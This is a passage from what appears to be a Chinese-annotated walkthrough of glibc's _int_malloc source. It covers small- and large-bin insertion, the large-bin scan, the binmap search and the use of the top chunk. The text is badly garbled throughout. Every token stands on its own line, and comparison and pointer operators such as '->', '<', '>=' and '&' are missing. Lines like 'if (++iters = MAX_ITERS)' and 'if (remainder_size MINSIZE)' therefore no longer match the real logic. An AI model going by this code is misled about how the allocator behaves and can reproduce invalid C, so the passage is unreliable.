\nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n\n\n\n\nplace chunk in small bin\n\n\n\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 small bin \u4e2d\u3002\n\n\n            \n/* place chunk in bin */\n\n\n            \nif\n \n(\nin_smallbin_range\n(\nsize\n))\n \n{\n\n                \nvictim_index\n \n=\n \nsmallbin_index\n(\nsize\n);\n\n                \nbck\n          \n=\n \nbin_at\n(\nav\n,\n \nvictim_index\n);\n\n                \nfwd\n          \n=\n \nbck\n-\nfd\n;\n\n\n\n\n\nplace chunk in large bin\n\n\n\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 large bin \u4e2d\u3002\n\n\n            \n}\n \nelse\n \n{\n\n                \n// large bin\u8303\u56f4\n\n                \nvictim_index\n \n=\n \nlargebin_index\n(\nsize\n);\n\n                \nbck\n          \n=\n \nbin_at\n(\nav\n,\n \nvictim_index\n);\n\n                \nfwd\n          \n=\n \nbck\n-\nfd\n;\n\n\n                \n/* maintain large bins in sorted order */\n\n                \n/* \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0clargebin \u4ee5 fd_nextsize \u9012\u51cf\u6392\u5e8f\u3002\n\n\n                   \u540c\u6837\u5927\u5c0f\u7684 chunk\uff0c\u540e\u6765\u7684\u53ea\u4f1a\u63d2\u5165\u5230\u4e4b\u524d\u540c\u6837\u5927\u5c0f\u7684 chunk \u540e\uff0c\n\n\n                   \u800c\u4e0d\u4f1a\u4fee\u6539\u4e4b\u524d\u76f8\u540c\u5927\u5c0f\u7684fd/bk_nextsize\uff0c\u8fd9\u4e5f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\n\n\n                   \u53ef\u4ee5\u51cf\u4f4e\u5f00\u9500\u3002\u6b64\u5916\uff0cbin \u5934\u4e0d\u53c2\u4e0e nextsize \u94fe\u63a5\u3002*/\n\n                \n// \u5982\u679c large bin \u94fe\u8868\u4e0d\u7a7a\n\n                \nif\n \n(\nfwd\n \n!=\n \nbck\n)\n \n{\n\n                    \n/* Or with inuse bit to speed comparisons */\n\n                    \n// \u52a0\u901f\u6bd4\u8f83\uff0c\u5e94\u8be5\u4e0d\u4ec5\u4ec5\u6709\u8fd9\u4e2a\u8003\u8651\uff0c\u56e0\u4e3a\u94fe\u8868\u91cc\u7684chunk\u90fd\u4f1a\u8bbe\u7f6e\u8be5\u4f4d\u3002\n\n                    \nsize\n \n|=\n \nPREV_INUSE\n;\n\n                    \n/* if smaller than smallest, bypass loop below */\n\n                    \n// bck-bk \u5b58\u50a8\u7740\u76f8\u5e94 large bin \u4e2d\u6700\u5c0f\u7684chunk\u3002\n\n                    \n// \u5982\u679c\u904d\u5386\u7684chunk\u6bd4\u5f53\u524d\u6700\u5c0f\u7684\u8fd8\u8981\u5c0f\uff0c\u90a3\u5c31\u53ea\u9700\u8981\u63d2\u5165\u5230\u94fe\u8868\u5c3e\u90e8\u3002\n\n                    \n// \u5224\u65ad bck-\nbk \u662f\u4e0d\u662f\u5728 main arena\u3002\n\n                    \nassert\n(\nchunk_main_arena\n(\nbck\n-\nbk\n));\n\n                    \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n\n                        \n(\nunsigned\n \nlong\n)\n \nchunksize_nomask\n(\nbck\n-\nbk\n))\n \n{\n\n                        \n// \u4ee4 fwd \u6307\u5411 bin \u5934\n\n                        \nfwd\n \n=\n \nbck\n;\n\n                        \n// \u4ee4 bck \u6307\u5411 bin \u5c3e\n\n                        \nbck\n \n=\n \nbck\n-\nbk\n;\n\n                        \n// victim \u7684 fd_nextsize \u6307\u5411\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk\n\n                        \nvictim\n-\nfd_nextsize\n \n=\n \nfwd\n-\nfd\n;\n\n                        \n// victim \u7684 bk_nextsize \u6307\u5411\u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2achunk \u6307\u5411\u7684bk_nextsize\n\n                        \nvictim\n-\nbk_nextsize\n \n=\n \nfwd\n-\nfd\n-\nbk_nextsize\n;\n\n                        \n// \u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u7684 bk_nextsize \u6307\u5411 victim\n\n                        \n// \u539f\u6765\u6307\u5411\u94fe\u8868\u7b2c\u4e00\u4e2a chunk \u7684 fd_nextsize \u6307\u5411 victim\n\n                        \nfwd\n-\nfd\n-\nbk_nextsize\n \n=\n\n                            \nvictim\n-\nbk_nextsize\n-\nfd_nextsize\n \n=\n \nvictim\n;\n\n                    \n}\n \nelse\n \n{\n\n                        \n// \u5f53\u524d\u8981\u63d2\u5165\u7684 victim \u7684\u5927\u5c0f\u5927\u4e8e\u6700\u5c0f\u7684 chunk \n\n                        \n// \u5224\u65ad fwd \u662f\u5426\u5728 main arena\n\n                        \nassert\n(\nchunk_main_arena\n(\nfwd\n));\n\n                        \n// \u4ece\u94fe\u8868\u5934\u90e8\u5f00\u59cb\u627e\u5230\u4e0d\u6bd4 victim \u5927\u7684 chunk\n\n                        \nwhile\n \n((\nunsigned\n \nlong\n)\n \nsize\n \n \nchunksize_nomask\n(\nfwd\n))\n \n{\n\n                            \nfwd\n \n=\n \nfwd\n-\nfd_nextsize\n;\n\n                            \nassert\n(\nchunk_main_arena\n(\nfwd\n));\n\n                        \n}\n\n                        \n// \u5982\u679c\u627e\u5230\u4e86\u4e00\u4e2a\u548c victim \u4e00\u6837\u5927\u7684 chunk\uff0c\n\n                        \n// \u90a3\u5c31\u76f4\u63a5\u5c06 chunk \u63d2\u5165\u5230\u8be5chunk\u7684\u540e\u9762\uff0c\u5e76\u4e0d\u4fee\u6539 nextsize \u6307\u9488\u3002\n\n                        \nif\n \n((\nunsigned\n \nlong\n)\n \nsize\n \n==\n\n                            \n(\nunsigned\n \nlong\n)\n \nchunksize_nomask\n(\nfwd\n))\n\n                            \n/* Always insert in the second position.  */\n\n                            \nfwd\n \n=\n \nfwd\n-\nfd\n;\n\n                        \nelse\n \n{\n\n                            \n// \u5982\u679c\u627e\u5230\u7684chunk\u548c\u5f53\u524dvictim\u5927\u5c0f\u4e0d\u4e00\u6837\n\n                            \n// \u90a3\u4e48\u4e45\u9700\u8981\u6784\u9020 nextsize \u53cc\u5411\u94fe\u8868\u4e86\n\n                            \nvictim\n-\nfd_nextsize\n              \n=\n \nfwd\n;\n\n                            \nvictim\n-\nbk_nextsize\n              \n=\n \nfwd\n-\nbk_nextsize\n;\n\n                            \nfwd\n-\nbk_nextsize\n                 \n=\n \nvictim\n;\n\n                            \nvictim\n-\nbk_nextsize\n-\nfd_nextsize\n \n=\n \nvictim\n;\n\n                        \n}\n\n                        \nbck\n \n=\n \nfwd\n-\nbk\n;\n\n                    \n}\n\n                \n}\n \nelse\n\n                    \n// \u5982\u679c\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u7b80\u5355\u4f7f\u5f97 fd_nextsize \u4e0e bk_nextsize \u6784\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u5373\u53ef\u3002\n\n                    \nvictim\n-\nfd_nextsize\n \n=\n \nvictim\n-\nbk_nextsize\n \n=\n \nvictim\n;\n\n            \n}\n\n\n\n\n\n\u6700\u7ec8\u53d6\u51fa\n\n\n            \n// \u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\uff0c\u6784\u6210 bk\n--\nvictim\n--\nfwd\u3002\n\n            \nmark_bin\n(\nav\n,\n \nvictim_index\n);\n\n            \nvictim\n-\nbk\n \n=\n \nbck\n;\n\n            \nvictim\n-\nfd\n \n=\n \nfwd\n;\n\n            \nfwd\n-\nbk\n    \n=\n \nvictim\n;\n\n            \nbck\n-\nfd\n    \n=\n \nvictim\n;\n\n\n\n\n\nwhile \u8fed\u4ee3\u6b21\u6570\n\n\nwhile \u6700\u591a\u8fed\u4ee310000\u6b21\u540e\u9000\u51fa\u3002\n\n\n            \n// \n\n\n##define MAX_ITERS 10000\n\n            \nif\n \n(\n++\niters\n \n=\n \nMAX_ITERS\n)\n \nbreak\n;\n\n        \n}\n\n\n\n\n\nlarge chunk\n\n\n\u6ce8\uff1a \u6216\u8bb8\u4f1a\u5f88\u5947\u602a\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6ca1\u6709\u5148\u53bb\u770b small chunk \u662f\u5426\u6ee1\u8db3\u65b0\u9700\u6c42\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3asmall bin \u5728\u5faa\u73af\u4e4b\u524d\u5df2\u7ecf\u5224\u65ad\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u662f\u5408\u5e76\u540e\u7684\u624d\u51fa\u73b0chunk\u3002\u4f46\u662f\u5728\u5927\u5faa\u73af\u5916\uff0clarge chunk \u53ea\u662f\u5355\u7eaf\u5730\u627e\u5230\u5176\u7d22\u5f15\uff0c\u6240\u4ee5\u89c9\u5f97\u5728\u8fd9\u91cc\u76f4\u63a5\u5148\u5224\u65ad\u662f\u5408\u7406\u7684\uff0c\u800c\u4e14\u4e5f\u4e3a\u4e86\u4e0b\u9762\u53ef\u4ee5\u518d\u53bb\u627e\u8f83\u5927\u7684chunk\u3002\n\n\n\u5982\u679c\u8bf7\u6c42\u7684 chunk \u5728 large chunk \u8303\u56f4\u5185\uff0c\u5c31\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u626b\u63cf\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u5408\u9002\u7684\u3002\n\n\n        \n/*\n\n\n           If a large request, scan through the chunks of current bin in\n\n\n           sorted order to find smallest that fits.  Use the skip list for this.\n\n\n         */\n\n        \nif\n \n(\n!\nin_smallbin_range\n(\nnb\n))\n \n{\n\n            \nbin\n \n=\n \nbin_at\n(\nav\n,\n \nidx\n);\n\n            \n/* skip scan if empty or largest chunk is too small */\n\n            \n// \u5982\u679c\u5bf9\u5e94\u7684 bin \u4e3a\u7a7a\u6216\u8005\u5176\u4e2d\u7684chunk\u6700\u5927\u7684\u4e5f\u5f88\u5c0f\uff0c\u90a3\u5c31\u8df3\u8fc7\n\n            \n// first(bin)=bin-\nfd \u8868\u793a\u5f53\u524d\u94fe\u8868\u4e2d\u6700\u5927\u7684chunk\n\n            \nif\n \n((\nvictim\n \n=\n \nfirst\n(\nbin\n))\n \n!=\n \nbin\n \n\n                \n(\nunsigned\n \nlong\n)\n \nchunksize_nomask\n(\nvictim\n)\n \n=\n\n                    \n(\nunsigned\n \nlong\n)\n \n(\nnb\n))\n \n{\n\n                \n// \u53cd\u5411\u904d\u5386\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5c0f\u4e8e\u6240\u9700chunk\u5927\u5c0f\u7684chunk\n\n                \nvictim\n \n=\n \nvictim\n-\nbk_nextsize\n;\n\n                \nwhile\n \n(((\nunsigned\n \nlong\n)\n \n(\nsize\n \n=\n \nchunksize\n(\nvictim\n))\n \n\n                        \n(\nunsigned\n \nlong\n)\n \n(\nnb\n)))\n\n                    \nvictim\n \n=\n \nvictim\n-\nbk_nextsize\n;\n\n\n                \n/* Avoid removing the first entry for a size so that the skip\n\n\n                   list does not have to be rerouted.  */\n\n                \n// \u5982\u679c\u6700\u7ec8\u53d6\u5230\u7684chunk\u4e0d\u662f\u8be5bin\u4e2d\u7684\u6700\u540e\u4e00\u4e2achunk\uff0c\u5e76\u4e14\u8be5chunk\u4e0e\u5176\u524d\u9762\u7684chunk\n\n                \n// \u7684\u5927\u5c0f\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53d6\u5176\u524d\u9762\u7684chunk\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u8c03\u6574bk_nextsize,fd_nextsize\n\n                \n//  \u94fe\u8868\u3002\u56e0\u4e3a\u5927\u5c0f\u76f8\u540c\u7684chunk\u53ea\u6709\u4e00\u4e2a\u4f1a\u88ab\u4e32\u5728nextsize\u94fe\u4e0a\u3002\n\n                \nif\n \n(\nvictim\n \n!=\n \nlast\n(\nbin\n)\n \n\n                    \nchunksize_nomask\n(\nvictim\n)\n \n==\n \nchunksize_nomask\n(\nvictim\n-\nfd\n))\n\n                    \nvictim\n \n=\n \nvictim\n-\nfd\n;\n\n                \n// \u8ba1\u7b97\u5206\u914d\u540e\u5269\u4f59\u7684\u5927\u5c0f\n\n                \nremainder_size\n \n=\n \nsize\n \n-\n \nnb\n;\n\n                \n// \u8fdb\u884cunlink\n\n                \nunlink\n(\nav\n,\n \nvictim\n,\n \nbck\n,\n \nfwd\n);\n\n\n                \n/* Exhaust */\n\n                \n// \u5269\u4e0b\u7684\u5927\u5c0f\u4e0d\u8db3\u4ee5\u5f53\u505a\u4e00\u4e2a\u5757\n\n                \n// \u5f88\u597d\u5947\u63a5\u4e0b\u6765\u4f1a\u600e\u4e48\u529e\uff1f\n\n                \nif\n \n(\nremainder_size\n \n \nMINSIZE\n)\n \n{\n\n                    \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nsize\n);\n\n                    \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n \nset_non_main_arena\n(\nvictim\n);\n\n                \n}\n\n                \n/* Split */\n\n                \n//  \u5269\u4e0b\u7684\u5927\u5c0f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2achunk\uff0c\u8fdb\u884c\u5206\u5272\u3002\n\n                \nelse\n \n{\n\n                    \n// \u83b7\u53d6\u5269\u4e0b\u90a3\u90e8\u5206chunk\u7684\u6307\u9488\uff0c\u79f0\u4e3aremainder\n\n                    \nremainder\n \n=\n \nchunk_at_offset\n(\nvictim\n,\n \nnb\n);\n\n                    \n/* We cannot assume the unsorted list is empty and therefore\n\n\n                       have to perform a complete insert here.  */\n\n                    \n// \u63d2\u5165unsorted bin\u4e2d\n\n                    \nbck\n \n=\n \nunsorted_chunks\n(\nav\n);\n\n                    \nfwd\n \n=\n \nbck\n-\nfd\n;\n\n                    \n// \u5224\u65ad unsorted bin \u662f\u5426\u88ab\u7834\u574f\u3002\n\n                    \nif\n \n(\n__glibc_unlikely\n(\nfwd\n-\nbk\n \n!=\n \nbck\n))\n \n{\n\n                        \nerrstr\n \n=\n \nmalloc(): corrupted unsorted chunks\n;\n\n                        \ngoto\n \nerrout\n;\n\n                    \n}\n\n                    \nremainder\n-\nbk\n \n=\n \nbck\n;\n\n                    \nremainder\n-\nfd\n \n=\n \nfwd\n;\n\n                    \nbck\n-\nfd\n       \n=\n \nremainder\n;\n\n                    \nfwd\n-\nbk\n       \n=\n \nremainder\n;\n\n                    \n// \u5982\u679c\u4e0d\u5904\u4e8esmall bin\u8303\u56f4\u5185\uff0c\u5c31\u8bbe\u7f6e\u5bf9\u5e94\u7684\u5b57\u6bb5\n\n                    \nif\n \n(\n!\nin_smallbin_range\n(\nremainder_size\n))\n \n{\n\n                        \nremainder\n-\nfd_nextsize\n \n=\n \nNULL\n;\n\n                        \nremainder\n-\nbk_nextsize\n \n=\n \nNULL\n;\n\n                    \n}\n\n                    \n// \u8bbe\u7f6e\u5206\u914d\u7684chunk\u7684\u6807\u8bb0\n\n                    \nset_head\n(\nvictim\n,\n\n                             \nnb\n \n|\n \nPREV_INUSE\n \n|\n\n                                 \n(\nav\n \n!=\n \nmain_arena\n \n?\n \nNON_MAIN_ARENA\n \n:\n \n0\n));\n\n\n                    \n// \u8bbe\u7f6eremainder\u7684\u4e0a\u4e00\u4e2achunk\uff0c\u5373\u5206\u914d\u51fa\u53bb\u7684chunk\u7684\u4f7f\u7528\u72b6\u6001\n\n                    \n// \u5176\u4f59\u7684\u4e0d\u7528\u7ba1\uff0c\u76f4\u63a5\u4ece\u4e0a\u9762\u7ee7\u627f\u4e0b\u6765\u4e86\n\n                    \nset_head\n(\nremainder\n,\n \nremainder_size\n \n|\n \nPREV_INUSE\n);\n\n                    \n// \u8bbe\u7f6eremainder\u7684\u5927\u5c0f\n\n                    \nset_foot\n(\nremainder\n,\n \nremainder_size\n);\n\n                \n}\n\n                \n// \u68c0\u67e5\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                \n// \u8f6c\u6362\u4e3amem\u72b6\u6001\n\n                \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \n// \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n        \n}\n\n\n\n\n\n\u5bfb\u627e\u8f83\u5927 chunk\n\n\n\u5982\u679c\u8d70\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u8bf4\u660e\u5bf9\u4e8e\u7528\u6237\u6240\u9700\u7684chunk\uff0c\u4e0d\u80fd\u76f4\u63a5\u4ece\u5176\u5bf9\u5e94\u7684\u5408\u9002\u7684bin\u4e2d\u83b7\u53d6chunk\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6765\u67e5\u627e\u6bd4\u5f53\u524d bin \u66f4\u5927\u7684 fast bin \uff0c small bin \u6216\u8005 large bin\u3002\n\n\n        \n/*\n\n\n           Search for a chunk by scanning bins, starting with next largest\n\n\n           bin. This search is strictly by best-fit; i.e., the smallest\n\n\n           (with ties going to approximately the least recently used) chunk\n\n\n           that fits is selected.\n\n\n\n           The bitmap avoids needing to check that most blocks are nonempty.\n\n\n           The particular case of skipping all bins during warm-up phases\n\n\n           when no chunks have been returned yet is faster than it might look.\n\n\n         */\n\n\n        \n++\nidx\n;\n\n        \n// \u83b7\u53d6\u5bf9\u5e94\u7684bin\n\n        \nbin\n   \n=\n \nbin_at\n(\nav\n,\n \nidx\n);\n\n        \n// \u83b7\u53d6\u5f53\u524d\u7d22\u5f15\u5728binmap\u4e2d\u7684block\u7d22\u5f15\n\n        \n// #define idx2block(i) ((i) \n BINMAPSHIFT)  ,BINMAPSHIFT=5\n\n        \n// Binmap\u6309block\u7ba1\u7406\uff0c\u6bcf\u4e2ablock\u4e3a\u4e00\u4e2aint\uff0c\u517132\u4e2abit\uff0c\u53ef\u4ee5\u8868\u793a32\u4e2abin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2chunk\u5b58\u5728\n\n        \n// \u6240\u4ee5\u8fd9\u91cc\u662f\u53f3\u79fb5\n\n        \nblock\n \n=\n \nidx2block\n(\nidx\n);\n\n        \n// \u83b7\u53d6\u5f53\u524d\u5757\u5927\u5c0f\u5bf9\u5e94\u7684\u6620\u5c04\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5f97\u77e5\u76f8\u5e94\u7684bin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2\u5757\n\n        \nmap\n   \n=\n \nav\n-\nbinmap\n[\n \nblock\n \n];\n\n        \n// #define idx2bit(i) ((1U \n ((i) \n ((1U \n BINMAPSHIFT) - 1))))\n\n        \n// \u5c06idx\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u8bbe\u7f6e\u4e3a1\uff0c\u5176\u5b83\u4f4d\u4e3a0\n\n        \nbit\n   \n=\n \nidx2bit\n(\nidx\n);\n\n        \nfor\n \n(;;)\n \n{\n\n\n\n\n\n\u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684 map\n\n\n            \n/* Skip rest of block if there are no more set bits in this block.\n\n\n             */\n\n            \n// \u5982\u679cbit\nmap\uff0c\u5219\u8868\u793a\u8be5 map \u4e2d\u6ca1\u6709\u6bd4\u5f53\u524d\u6240\u9700\u8981chunk\u5927\u7684\u7a7a\u95f2\u5757\n\n            \n// \u5982\u679cbit\u4e3a0\uff0c\u90a3\u4e48\u8bf4\u660e\uff0c\u4e0a\u9762idx2bit\u5e26\u5165\u7684\u53c2\u6570\u4e3a0\u3002\n\n            \nif\n \n(\nbit\n \n \nmap\n \n||\n \nbit\n \n==\n \n0\n)\n \n{\n\n                \ndo\n \n{\n\n                    \n// \u5bfb\u627e\u4e0b\u4e00\u4e2ablock\uff0c\u76f4\u5230\u5176\u5bf9\u5e94\u7684map\u4e0d\u4e3a0\u3002\n\n                    \n// \u5982\u679c\u5df2\u7ecf\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u90a3\u5c31\u53ea\u80fd\u4f7f\u7528top chunk\u4e86\n\n                    \nif\n \n(\n++\nblock\n \n=\n \nBINMAPSIZE\n)\n \n/* out of bins */\n\n                        \ngoto\n \nuse_top\n;\n\n                \n}\n \nwhile\n \n((\nmap\n \n=\n \nav\n-\nbinmap\n[\n \nblock\n \n])\n \n==\n \n0\n);\n\n                \n// \u83b7\u53d6\u5176\u5bf9\u5e94\u7684bin\uff0c\u56e0\u4e3a\u8be5map\u4e2d\u7684chunk\u5927\u5c0f\u90fd\u6bd4\u6240\u9700\u7684chunk\u5927\uff0c\u800c\u4e14\n\n                \n// map\u672c\u8eab\u4e0d\u4e3a0\uff0c\u6240\u4ee5\u5fc5\u7136\u5b58\u5728\u6ee1\u8db3\u9700\u6c42\u7684chunk\u3002\n\n                \nbin\n \n=\n \nbin_at\n(\nav\n,\n \n(\nblock\n \n \nBINMAPSHIFT\n));\n\n                \nbit\n \n=\n \n1\n;\n\n            \n}\n\n\n\n\n\n\u627e\u5230\u5408\u9002\u7684 bin\n\n\n            \n/* Advance to bin with set bit. There must be one. */\n\n            \n// \u4ece\u5f53\u524dmap\u7684\u6700\u5c0f\u7684bin\u4e00\u76f4\u627e\uff0c\u76f4\u5230\u627e\u5230\u5408\u9002\u7684bin\u3002\n\n            \n// \u8fd9\u91cc\u662f\u4e00\u5b9a\u5b58\u5728\u7684\n\n            \nwhile\n \n((\nbit\n \n \nmap\n)\n \n==\n \n0\n)\n \n{\n\n                \nbin\n \n=\n \nnext_bin\n(\nbin\n);\n\n                \nbit\n \n=\n \n1\n;\n\n                \nassert\n(\nbit\n \n!=\n \n0\n);\n\n            \n}\n\n\n\n\n\n\u7b80\u5355\u68c0\u67e5 chunk\n\n\n            \n/* Inspect the bin. It is likely to be non-empty */\n\n            \n// \u83b7\u53d6\u5bf9\u5e94\u7684bin\n\n            \nvictim\n \n=\n \nlast\n(\nbin\n);\n\n\n            \n/*  If a false alarm (empty bin), clear the bit. */\n\n            \n// \u5982\u679cvictim=bin\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06map\u5bf9\u5e94\u7684\u4f4d\u6e050\uff0c\u7136\u540e\u83b7\u53d6\u4e0b\u4e00\u4e2abin\n\n            \n// \u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u7684\u6982\u7387\u5e94\u8be5\u5f88\u5c0f\u3002\n\n            \nif\n \n(\nvictim\n \n==\n \nbin\n)\n \n{\n\n                \nav\n-\nbinmap\n[\n \nblock\n \n]\n \n=\n \nmap\n \n=\n \n~\nbit\n;\n \n/* Write through */\n\n                \nbin\n                 \n=\n \nnext_bin\n(\nbin\n);\n\n                \nbit\n \n=\n \n1\n;\n\n            \n}\n\n\n\n\n\n\u771f\u6b63\u53d6\u51fachunk\n\n\n            \nelse\n \n{\n\n                \n// \u83b7\u53d6\u5bf9\u5e94victim\u7684\u5927\u5c0f\n\n                \nsize\n \n=\n \nchunksize\n(\nvictim\n);\n\n\n                \n/*  We know the first chunk in this bin is big enough to use. */\n\n                \nassert\n((\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n=\n \n(\nunsigned\n \nlong\n)\n \n(\nnb\n));\n\n                \n// \u8ba1\u7b97\u5206\u5272\u540e\u5269\u4f59\u7684\u5927\u5c0f\n\n                \nremainder_size\n \n=\n \nsize\n \n-\n \nnb\n;\n\n\n                \n/* unlink */\n\n                \nunlink\n(\nav\n,\n \nvictim\n,\n \nbck\n,\n \nfwd\n);\n\n\n                \n/* Exhaust */\n\n                \n// \u5982\u679c\u5206\u5272\u540e\u4e0d\u591f\u4e00\u4e2achunk\u600e\u4e48\u529e\uff1f\n\n                \nif\n \n(\nremainder_size\n \n \nMINSIZE\n)\n \n{\n\n                    \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nsize\n);\n\n                    \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n \nset_non_main_arena\n(\nvictim\n);\n\n                \n}\n\n\n                \n/* Split */\n\n                \n// \u5982\u679c\u591f\uff0c\u5c3d\u7ba1\u5206\u5272\n\n                \nelse\n \n{\n\n                    \n// \u8ba1\u7b97\u5269\u4f59\u7684chunk\u7684\u504f\u79fb\n\n                    \nremainder\n \n=\n \nchunk_at_offset\n(\nvictim\n,\n \nnb\n);\n\n\n                    \n/* We cannot assume the unsorted list is empty and therefore\n\n\n                       have to perform a complete insert here.  */\n\n                    \n// \u5c06\u5269\u4f59\u7684chunk\u63d2\u5165\u5230unsorted bin\u4e2d\n\n                    \nbck\n \n=\n \nunsorted_chunks\n(\nav\n);\n\n                    \nfwd\n \n=\n \nbck\n-\nfd\n;\n\n                    \nif\n \n(\n__glibc_unlikely\n(\nfwd\n-\nbk\n \n!=\n \nbck\n))\n \n{\n\n                        \nerrstr\n \n=\n \nmalloc(): corrupted unsorted chunks 2\n;\n\n                        \ngoto\n \nerrout\n;\n\n                    \n}\n\n                    \nremainder\n-\nbk\n \n=\n \nbck\n;\n\n                    \nremainder\n-\nfd\n \n=\n \nfwd\n;\n\n                    \nbck\n-\nfd\n       \n=\n \nremainder\n;\n\n                    \nfwd\n-\nbk\n       \n=\n \nremainder\n;\n\n\n                    \n/* advertise as last remainder */\n\n                    \n// \u5982\u679c\u5728small bin\u8303\u56f4\u5185\uff0c\u5c31\u5c06\u5176\u6807\u8bb0\u4e3aremainder\n\n                    \nif\n \n(\nin_smallbin_range\n(\nnb\n))\n \nav\n-\nlast_remainder\n \n=\n \nremainder\n;\n\n                    \nif\n \n(\n!\nin_smallbin_range\n(\nremainder_size\n))\n \n{\n\n                        \nremainder\n-\nfd_nextsize\n \n=\n \nNULL\n;\n\n                        \nremainder\n-\nbk_nextsize\n \n=\n \nNULL\n;\n\n                    \n}\n\n                    \n// \u8bbe\u7f6evictim\u7684\u4f7f\u7528\u72b6\u6001\n\n                    \nset_head\n(\nvictim\n,\n\n                             \nnb\n \n|\n \nPREV_INUSE\n \n|\n\n                                 \n(\nav\n \n!=\n \nmain_arena\n \n?\n \nNON_MAIN_ARENA\n \n:\n \n0\n));\n\n                    \n// \u8bbe\u7f6eremainder\u7684\u4f7f\u7528\u72b6\u6001\uff0c\u8fd9\u91cc\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f\n\n                    \nset_head\n(\nremainder\n,\n \nremainder_size\n \n|\n \nPREV_INUSE\n);\n\n                    \n// \u8bbe\u7f6eremainder\u7684\u5927\u5c0f\n\n                    \nset_foot\n(\nremainder\n,\n \nremainder_size\n);\n\n                \n}\n\n                \n// \u68c0\u67e5\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                \n// chunk\u72b6\u6001\u8f6c\u6362\u5230mem\u72b6\u6001\n\n                \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \n// \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n\n\n\n\n\u4f7f\u7528 top chunk\n\n\n\u5982\u679c\u6240\u6709\u7684 bin \u4e2d\u7684 chunk \u90fd\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u6ee1\u8db3\u8981\u6c42\uff08\u5373\u4e0d\u5408\u5e76\uff09\uff0c\u6216\u8005\u8bf4\u90fd\u6ca1\u6709\u7a7a\u95f2\u7684 chunk\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u53ea\u80fd\u4f7f\u7528 top chunk \u4e86\u3002\n\n\n    \nuse_top\n:\n\n        \n/*\n\n\n           If large enough, split off the chunk bordering the end of memory\n\n\n           (held in av-\ntop). Note that this is in accord with the best-fit\n\n\n           search rule.  In effect, av-\ntop is treated as larger (and thus\n\n\n           less well fitting) than any other available chunk since it can\n\n\n           be extended to be as large as necessary (up to system\n\n\n           limitations).\n\n\n\n           We require that av-\ntop always exists (i.e., has size \n=\n\n\n           MINSIZE) after initialization, so if it would otherwise be\n\n\n           exhausted by current request, it is replenished. (The main\n\n\n           reason for ensuring it exists is that we may need MINSIZE space\n\n\n           to put in fenceposts in sysmalloc.)\n\n\n         */\n\n        \n// \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\n\n        \nvictim\n \n=\n \nav\n-\ntop\n;\n\n        \nsize\n   \n=\n \nchunksize\n(\nvictim\n);\n\n        \n// \u5982\u679c\u5206\u5272\u4e4b\u540e\uff0ctop chunk \u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002\n\n        \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n=\n \n(\nunsigned\n \nlong\n)\n \n(\nnb\n \n+\n 